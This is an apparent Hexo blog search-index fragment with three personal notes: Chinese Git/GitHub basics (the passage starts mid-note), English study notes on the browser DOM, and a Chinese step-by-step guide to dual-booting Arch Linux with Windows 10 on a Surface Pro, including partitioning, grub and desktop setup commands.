不但会把本地的 master 分支内容推送的远程新的 master 分支, 还会把本地的 master 分支和远程的 master 分支关联起来, 在以后的推送或者拉取时就可以简化命令, 以后只需要使用 git push origin master. 当你第一次使用 Git 的 clone 或者 push 命令连接 GitHub 时, 会得到一个 SSH 警告, 输入 yes 回车即可, 这个警告只会出现一次, 后面的操作就不会有任何警告了. Github 的基本使用如何参与一个开源项目(比如 Bootstrap)呢? 点 Fork 就在自己的账号下克隆了一个 Bootstrap 仓库, 然后从自己的账号下 clone 下来: git clone git@github.com:&lt;AccountName&gt;/bootstrap.git.Bootstrap 的官方仓库 twbs/bootstrap, 你在 GitHub 上克隆的仓库 my/bootstrap, 以及你自己克隆到本地电脑的仓库, 他们的关系就像下图显示的那样: 然后在本地修改一个 Bug, 推送到 Github 仓库, 如果你希望 Bootstrap 的官方库能接受你的修改, 你就可以在 GitHub 上发起一个 pull request.]]></content>
      <categories>
        <category>Development Tools</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Document Object]]></title>
    <url>%2F2018%2F07%2F31%2FDom%2F</url>
    <content type="text"><![CDATA[This is a learning note about Dom, the material is from the web site javascript.info. DocumentHere’s a bird’s-eye view of what we have when JavaScript runs in a web-browser: javascript DOM (Document Object Model) — The document object gives access to the page content. BOM (Browser Object Model) — navigator object, location object, history object, XMLHttpRequest, etc. DOM TreeAccording to Document Object Model (DOM), every HTML-tag is an object. The text inside a tag it is an object as well. Everything in HTML, even comments, becomes a part of the DOM. There are 12 node types. In practice we usually work with 4 of them: document – the “entry point” into DOM. element nodes – HTML-tags, the tree building blocks. text nodes – contain text. comments. Walking the DOMGiven a DOM node, we can go to its immediate neighbours using navigation properties. There are two main sets of them: For all nodes: parentNode, childNodes, firstChild, lastChild, previousSibling, nextSibling. For element nodes only: parentElement, children, firstElementChild, lastElementChild,previousElementSibling, nextElementSibling. childNodes(children) looks like an array. But actually it’s not an array, but rather a collection – a special array-like iterable object. There are two important consequences: We can use for..of to iterate over it. (Don’t use for..in to loop over collections, The for..in loop iterates over all enumerable properties, and return some “extra” rarely used properties that we usually do not want to get). Array methods won’t work, because it’s not an array. We can use Array.from to create a “real” array from the collection, if we want array methods. DOM collections are read-only; DOM collections are live, in other words, they reflect the current state of DOM. Searching in the DOM Method Searches By… Can call on an element Live? getElementById id - - getElementsByTagName tag ✔ ✔ getElementsByClassName class ✔ ✔ querySelectorAll CSS-selector ✔ - querySelector CSS-selector ✔ - Please note that methods getElementById and getElementsByName can only be called in the context of the document: document.getElementById(...). The call to elem.querySelector(css) returns the first element for the given CSS selector. In other words, the result is the same as elem.querySelectorAll(css)[0], but the latter is looking for all elements and picking one, while elem.querySelector just looks for one. So it’s faster and shorter to write. Besides that: There is elem.matches(css) to check if elem matches the given CSS selector. There is elem.closest(css) to look for the nearest ancestor that matches the given CSS-selector. The elem itself is also checked. Node PropertiesEach DOM node belongs to a certain class. The classes form a hierarchy. The full set of properties and methods come as the result of inheritance. The innerHTML property allows to get the HTML inside the element as a string, we can also modify it. We can append “more HTML” by using elem.innerHTML+=&quot;something&quot;. innerHTML+= does this: The old contents is removed. The new innerHTML is written instead. As the content is “zeroed-out” and rewritten from the scratch, all images and other resources will be reloaded. If the existing text was selected with the mouse, then most browsers will remove the selection upon rewriting innerHTML. And if there was an &lt;input&gt; with a text entered by the visitor, then the text will be removed. And so on. The innerHTML property is only valid for element nodes. Other node types have their counterpart: nodeValue and data(preferred) properties. The textContent provides access to the text inside the element: only text, minus all . With innerHTML we’ll have it inserted “as HTML”, with all HTML tags, while with textContent, we’ll have it inserted “as text”, all symbols are treated literally. In most cases, we expect the text from a user, and want to treat it as text. We don’t want unexpected HTML in our site. An assignment to textContent does exactly that. hidden works the same as style=&quot;display:none&quot;. But it’s shorter to write. Attribute and PropertiesWhen the browser loads the page, it parses HTML text and generates DOM objects from it. For element nodes most standard HTML attributes automatically become properties of DOM objects. When a standard attribute changes, the corresponding property is auto-updated with some exceptions, e.g., input.value synchronizes only from attribute → to property, but not back. There are some differences bewteen them: the style attribute is a string, but the style property is an object, the href DOM property is always a full URL while the attribute is not. All attributes(including nonstandard attribute) are accessible using following methods: elem.hasAttribute(name) – checks for existence. elem.getAttribute(name) – gets the value. elem.setAttribute(name, value) – sets the value. elem.removeAttribute(name) – removes the attribute. All attributes starting with “data-” are reserved for programmers’ use. They are available in the dataset property. Multiword attributes like data-order-state become camel-cased: dataset.orderState. Modifying the documentMethods to create new nodes: document.createElement(tag) – creates an element with the given tag, document.createTextNode(value) – creates a text node (rarely used), elem.cloneNode(deep) – clones the element, if deep==true then with all descendants. Insertion and removal of nodes: From the parent: parent.appendChild(node) parent.insertBefore(node, nextSibling) parent.removeChild(node) parent.replaceChild(newElem, node) All these methods return node. Given a list of nodes and strings: node.append(...nodes or strings) – insert into node, at the end, node.prepend(...nodes or strings) – insert into node, at the beginning, node.before(...nodes or strings) –- insert right before node, node.after(...nodes or strings) –- insert right after node, node.replaceWith(...nodes or strings) –- replace node. node.remove() –- remove the node. Text strings are inserted “as text”. Given a piece of HTML: elem.insertAdjacentHTML(where, html), inserts depending on where: “beforebegin” – insert html right before elem, “afterbegin” – insert html into elem, at the beginning, “beforeend” – insert html into elem, at the end, “afterend” – insert html right after elem. Also there are similar methods elem.insertAdjacentText and elem.insertAdjacentElement, they insert text strings and elements, but they are rarely used. Styles and classesTo manage classes, there are two DOM properties: className and classList. If we assign something to elem.className, it replaces the whole strings of classes. Sometimes that’s what we need, but often we just want to add/remove a single class. There’s another property for that: elem.classList. The elem.classList is a special object with methods to add/remove/toggle classes. Methods of classList: elem.classList.add/remove(&quot;class&quot;) – adds/removes the class. elem.classList.toggle(&quot;class&quot;) – if the class exists, then removes it, otherwise adds it. elem.classList.contains(&quot;class&quot;) – returns true/false, checks for the given class. The property elem.style is an object that corresponds to what’s written in the “style” attribute. For multi-word property the camelCase is used: border-left-width =&gt; elem.style.borderLeftWidth, browser-prefixed properties like -moz-border-radius =&gt;button.style.MozBorderRadius(a dash “-“ becomes an uppercase). CSS units must be provided in style values. For instance, we should not set elem.style.top to 10, but rather to 10px, otherwise it wouldn’t work. Modifying a style is easy. But how to read it? The style property operates only on the value of the “style” attribute, without any CSS cascade. There’s another method for that: getComputedStyle. To read the resolved styles (with respect to all classes, after all CSS is applied and final values are calculated): The getComputedStyle(elem[, pseudo]) returns the style-like object with them. (Read-only; returns the resolved value; requires the full property name) Element size and scrollingElements have the following geometry properties: offsetParent – is the nearest positioned ancestor or td, th, table, body. offsetLeft/offsetTop – coordinates relative to the left-upper edge of offsetParent. offsetWidth/offsetHeight – “outer” width/height of an element including borders. clientLeft/clientTop – the distance from the left-upper outer corner to its left-upper inner corner. For left-to-right OS they are always the widths of left/top borders. For right-to-left OS the vertical scrollbar is on the left so clientLeft includes its width too. clientWidth/clientHeight – the width/height of the content including paddings, but without the scrollbar. scrollWidth/scrollHeight – the width/height of the content including the scrolled out parts. Also includes paddings, but not the scrollbar. scrollLeft/scrollTop – width/height of the scrolled out part of the element, starting from its left-upper corner. All properties are read-only except scrollLeft/scrollTop. They make the browser scroll the element if changed. Don’t take width/height from CSS. We can read CSS-height and width using getComputedStyle. Why should we use geometry properties instead? There are two reasons: CSS width/height depend on another property: box-sizing, CSS width/height may be auto. Some browsers (e.g. Chrome) return the real inner width, minus the scrollbar, and some of them (e.g. Firefox) – CSS width (ignore the scrollbar). Such cross-browser differences is the reason not to use getComputedStyle, but rather rely on geometry properties. Window sizes and scrollingGeometry: Width/height of the visible part of the document (content area width/height):document.documentElement.clientWidth/Height. Width/height of the whole document, with the scrolled out part:12345let scrollHeight = Math.max( document.body.scrollHeight, document.documentElement.scrollHeight, document.body.offsetHeight, document.documentElement.offsetHeight, document.body.clientHeight, document.documentElement.clientHeight); Scrolling: Most browsers provide documentElement.scrollLeft/Top for the document scroll, but Chrome/Safari/Opera have bugs and we should use document.body instead of document.documentElement there. Luckily, we don’t have to remember these peculiarities at all, because of the following special properties: Read the current scroll: window.pageYOffset/pageXOffset. Change the current scroll: window.scrollTo(pageX,pageY) – absolute coordinates, window.scrollBy(x,y) – scroll relative the current place, elem.scrollIntoView(top) – scroll to make elem visible (align with the top/bottom of the window). CoordinatesAny point on the page has coordinates: Relative to the window – elem.getBoundingClientRect(). Relative to the document – elem.getBoundingClientRect() plus the current page scrollwindow.pageXOffset/pageYOffset. Window coordinates are great to use with position:fixed, and document coordinates do well with position:absolute. Both coordinate systems have their “pro” and “contra”, there are times we need one or the other one, just like CSS position absolute and fixed. Words and phrases: out of nowhere 莫名其妙的出现 superposition 叠加]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Arch Linux]]></title>
    <url>%2F2018%2F07%2F18%2FArchlinux%2F</url>
    <content type="text"><![CDATA[Dual Booting Arch Linux / Windows 10 On Surface Pro. 设备Device: Surface Pro 2017OS: Windows 10 / Arch Linux 2018.05.01Method: USB Installer 准备工作 压缩卷右键开始 –&gt; 磁盘管理(K) –&gt; 选择主分区 –&gt; 压缩卷 –&gt; 分出 40 G. 制作启动盘下载 Arch Linux 和 Rufus 并制作好启动盘（选择 UEFI, PT). 设置从 USB 启动首先按住音量键并启动, 入 UEFI, 闭安全启动, 将启动顺序改为从 USB 启动. 插入 USB 后 Reboot 就能从 USB 启动 Arch Linux. 选择第一个选项进入系统. 安装过程安装过程需要使用网络. 用数据线连接手机, 开 USB 网络共享. 设置屏幕字体大小由于分辨率太高, 致字体显示太小, 新设置终端字体 1# setfont /usr/share/kbd/consolefonts/latarcyrheb-sun32.psfu.gz 测试网络连接 123# dhcpcd# ping -c 3 www.baidu.com // 成功接收到数据包则连接成功# timedatectl set-ntp true 分区 123456789101112# fdisk -l // 以下是一个输出实例nvme0n1 259:0 0 238.5G|- nvme0n1p1 259:1 0 260M|- nvme0n1p2 259:2 0 128M|- nvme0n1p3 259:3 0 174.8G|- nvme0n1p4 259:4 0 830M# gdisk /dev/nvme0n1/*1. n(new) 2. 在last sector时 +20G, 其余回车, 择默认设置 3. n 回车选择默认设置, 出第 6 部分 4. p 看是否分区成功 5. w(write) Y(Yes)*/ 格式化 12# mkfs.ext4 /dev/nvme0n1p5# mkfs.ext4 /dev/nvme0n1p6 挂载 12345# mount /dev/nvme0n1p5 /mnt# mkdir /mnt/home# mount /dev/nvme0n1p6 /mnt/home# mkdir -p /mnt/boot/efi // 创建 UEFI 挂载点# mount /dev/nvme0n1p1 /mnt/boot/efi // 挂载 UEFI 分区 安装 base 12345# vi /etc/pacman.d/mirrorlist //把 163 的提到第一个# pacstrap -i /mnt base base-devel# genfstab -U /mnt &gt;&gt; /mnt/etc/fstab# cat /mnt/etc/fstab# arch-chroot /mnt 安装 grub 123# pacman -S dosfstools grub efibootmgr os-prober(双系统必装)# grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=grub# grub-mkconfig -o /boot/grub/grub.cfg //(reboot 后还要运行一次, 行结果才会出现windows manager) 重启 reboot 12345# passwd // 设置 root 密码# CTRL-D // exit# umount /mnt/boot/efi# umount /mnt# reboot // 记得移除 USB 基本设置 重启以 root 身份登录. 123# setfont /usr/share/kbd/consolefonts/latarcyrheb-sun32.psfu.gz# dhcpcd# ping -c 3 www.baidu.com // 成功接收到数据包则连接成功 时区 1# ln -S /usr/share/zoneinfo/Asia/Shanghai /etc/localtime Locale 12345# vi /etc/locale.gen // 移除下面两行前的注释符号en\_US.UTF-8 UTF-8zh\_CN.UTF-8 UTF-8# locale-gen# echo LANG=en_US.UTF-8 &gt; /etc/locale.conf hostname 123456789# echo Arch &gt; /etc/hostname //将主机 Arch 入# vi /etc/hosts // 修改 host完成后看起来像这样:# cat /etc/hostnameArch# cat /etc/hosts127.0.0.1 localhost.localdomain localhost::1 localhost.localdomain localhost127.0.1.1 Arch.localdomain Arch 时间Linux 和 Windows 开机都会从 BIOS 读取硬件时间(RTC). Windonws 默认把这个时间当做是你所在地的时间(Local Time), 系统将这个时间显示出来, 因此我们在系统上看到的时间(系统时间)就是硬件时间. Linux 默认把硬件时间当做英国现在的时间(UTC), 然后根据你设定的时区计算出当地时间(Local Time). 例如时区如果是 Asia/Shanghai, 那么就把硬件时间(RTC) +8:00:00, 再显示成系统时间. 因此你在 Linux 上看到的时间要比 Windows 上显示的时间快 8 小时. 我们把 Windows 10(64 位)设置成使用 UTC 时间: 用管理员权限启动 Powershell 运行 1reg add &quot;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\TimeZoneInformation&quot; /v RealTimeIsUniversal /d 1 /t REG_QWORD /f 然后利用 Windows 10 自动更新时间, 这样关机后 Windows 上显示的正确时间会减 8 小时再写入成硬件时间. 开机后 Linux 上显示的时间就是正确的了.最后记得建议关闭Windows 10 下的自动更新时间. 12345678$ timedatectl Local time: Fri 2018-09-28 16:28:59 CST Universal time: Fri 2018-09-28 08:28:59 UTC RTC time: Fri 2018-09-28 08:28:59 Time zone: Asia/Shanghai (CST, +0800)System clock synchronized: yes NTP service: active RTC in local TZ: no 网络 123# systemctl enable dhcpcd# pacman -S networkmanager iw wpa_supplicant dialog# systemctl enable NetworkManager 显卡, Touchpad 驱动 12# pacman -S xf86-video-intel# pacman -S xf86-input-libinput gnome 12# pacman -S gnome gnome-tweaks# systemctl enable gdm 重启后 gnome 启动, 登录 root 账户, 在 account setting 中 add users 后, log out 重新以 user 的身份登录. gnome 设置 Touchpad 左键使用不习惯.setting –&gt; devices –&gt; mouse and touchpad –&gt; tab to click;tweaks –&gt; mouse &amp; touchpad –&gt; Mouse click emulation (Area). sudo 12$ sudo pacman -S sudo vim$ visudo //（在 root ALL=(ALL)下面仿照格式把 root 改成 username） 添加 archlinuxcn 源 123456$ sudo vim /etc/pacman.conf // 添加以下几行[archlinuxcn]#The Chinese Arch Linux communities packages.SigLevel = Optional TrustAllServer = http://repo.archlinuxcn.org/$arch$ sudo pacman -Syu 搜狗拼音 12345$ sudo pacman -S fcitx-im fcitx-configtool fcitx-sogoupinyin$ sudo vim /etc/environment // 写入export GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport XMODIFIERS=@im=fcitx 然后还需要修改 fcitx-configtool 中的设置: Default Keyboard Layout –&gt; 选择 Chinese, 添加 –&gt; Add input method（+号）选择 Sougou Pinyin. chrome 123$ sudo pacman -S wqy-microhei wqy-zenhei yaourt// 字体$ sudo yaourt -S google-chrome // 如 root 号下安装 chrome, chrome 无法启动.$ sudo pacman -R epiphany shadowsocks 1$ sudo pacman -S shadowsocks-qt5 浏览器上安装 SwitchyOmega 插件. 桌面美化 下载 Extensions(dash-to-dock, hidetipbar, pixel-saver), 解压缩后, 放到: ~/.local/share/gnome-shell/extensions/ 下.下载 Icon Theme: MacOS iCons, 解压缩后, 放到: home/.icons/ 下.下载 GTK3 Theme: Gnome-OSC, 解压缩后, 把里面两个文件, 放到: home/.themes/下.[下载] Gnome Shell Theme: masOS11-shell 放到 home/.themes/下.Alt-F2 + rs后, 代开 Gnoem-Tweaks 进行设置. 解决休眠问题 123$ sudo vim /etc/systemd/logind.confHandleLidSwitch=ignore$ systemctl restart systemd-logind setting –&gt; power, 关闭 atutosuspend, dim screen. pacman 指南 1$ pacman -S archlinux-keyring Command Outcome sudo pacman -Ss [pkg] 搜索包 sudo pacman -S [pkg] 安装包 sudo pacman -Syu 安装并升级包 sudo pacman -Sc 清除未安装软件包的缓存 sudo pacman -Qii [pkg] 列出安装过的包的信息 sudo pacman -Rns [pkg] 删除包 sudo pacman -Rns $(pacman -Qdtq) 删除不需要的包]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
</search>
